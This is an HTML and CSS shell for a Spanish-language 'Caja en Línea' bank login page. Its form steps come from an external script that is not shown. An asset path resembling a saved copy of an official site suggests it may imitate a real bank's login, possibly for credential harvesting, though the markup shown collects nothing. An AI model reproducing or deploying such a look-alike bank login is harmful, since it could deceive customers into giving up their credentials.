<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Caja en Línea de Caja de Ahorros</title>
  <link rel="icon" href="/oficial/index_files/logo_icon.svg">
  <style>
    * { box-sizing: border-box; }
    html, body {
      margin: 0;
      min-height: 100%;
      font-family: Arial, Helvetica, sans-serif;
      background: linear-gradient(135deg, #0f7a83 0%, #0d607d 23%, #093573 52%, #051537 100%);
      background-attachment: fixed;
    }
    body {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 6vh 16px 0;
    }
    .card {
      width: min(420px, 100%);
      background: #d5d5d5;
      box-shadow: 0 8px 24px rgba(0,0,0,.28);
    }
    .card-header {
      background: linear-gradient(135deg, #0f7a83 0%, #0d607d 23%, #093573 52%, #051537 100%);
      color: #fff;
      text-align: center;
      padding: 22px 16px 18px;
    }
    .card-header h1 {
      margin: 0 0 10px;
      font-size: 24px;
      font-weight: 700;
      letter-spacing: .04em;
    }
    .card-header img {
      width: 210px;
      max-width: 80%;
      height: auto;
    }
    .card-body { padding: 28px 20px 22px; }
    .field {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 18px;
    }
    .field img { width: 42px; height: 42px; }
    .field input {
      flex: 1;
      height: 38px;
      border: 0;
      padding: 0 12px;
      font-size: 14px;
      color: #083575;
      text-transform: uppercase;
    }
    .field input::placeholder { color: #9aa4b0; text-transform: uppercase; }
    .actions { display: flex; justify-content: flex-end; }
    .btn {
      min-width: 140px;
      height: 38px;
      border: 0;
      border-radius: 2px;
      background: #0a4d73;
      color: #fff;
      font-size: 16px;
      cursor: pointer;
    }
    .btn:disabled { opacity: .55; cursor: default; }
    .btn-outline {
      background: #fff;
      color: #0a4d73;
      border: 1px solid #0a4d73;
      margin-top: 10px;
    }
    .mascot {
      display: block;
      width: 220px;
      margin: 8px auto 0;
    }
    .loading {
      min-height: 180px;
      display: grid;
      place-items: center;
    }
    .ring {
      width: 46px;
      height: 46px;
      border: 4px solid #c5d3de;
      border-top-color: #083575;
      border-radius: 50%;
      animation: spin .7s linear infinite;
    }
    .spin-btn {
      width: 18px;
      height: 18px;
      border: 2px solid rgba(255,255,255,.35);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin .7s linear infinite;
      display: inline-block;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    @media (max-width: 640px) {
      .mascot { width: 160px; }
    }
  </style>
</head>
<body>
  <div class="card" id="login-card">
    <div class="card-header">
      <h1>CAJA EN LÍNEA</h1>
      <img src="./cda-logo.svg" alt="Caja de Ahorros">
    </div>
    <div class="card-body" id="step"></div>
  </div>
  <img class="mascot" src="./mascota.png" alt="">
  <script src="./app.js"></script>
</body>
</html>
